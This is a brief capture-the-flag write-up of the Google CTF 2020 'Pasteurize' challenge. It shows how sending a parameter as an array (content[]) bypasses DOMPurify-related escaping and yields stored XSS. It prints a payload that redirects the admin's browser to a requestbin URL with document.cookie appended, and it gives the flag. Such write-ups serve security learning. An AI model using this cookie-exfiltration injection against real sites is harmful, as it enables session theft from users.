#Google CTF 2020 - Pasteurize 

**tl;dr**

+ Share a paste with an alert() which will be viewd by admin
+ " gets escaped
+ send http request with content[]=xyz



## Challenge description
This does'nt look secure. I wouldnt put even the littlest secret in here. My source tells me that third parties might have implanted with their little treats already. Can you prove me right?


## Initial analysis
 
<img src="/posts/files/gctf_pasteurize/one.png">

We are provided with a `Create paste` functionality which will be later checked by tj mike ; the admin. So we would jump on to XSS and give an alert(). When we check the source code we see that the input was sanitised with DOMpurify(). 


<img src="/posts/files/gctf_pasteurize/three.png">

We were also provided with a source, which have the functionality `const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');` so we know that `"` was being escaped.


<img src="/posts/files/gctf_pasteurize/four.png">

One of the xss game had passing http request as content[]=data and providing a `content[]=+alert+` gave a redirection. So when we appended the request as `content[]=;document.location='http://requestbin.net/r/1karrwz1?'.concat(document.cookie);` we get the redirection to requestbin 

<img src="/posts/files/gctf_pasteurize/eight.png">

Finally we get the flag in request bin


## Flag

**FLAG**: `secret=CTF{Express_t0_Tr0ubl3s}`

For further queries, please DM me on Twitter: <https://twitter.com/m0n574>.

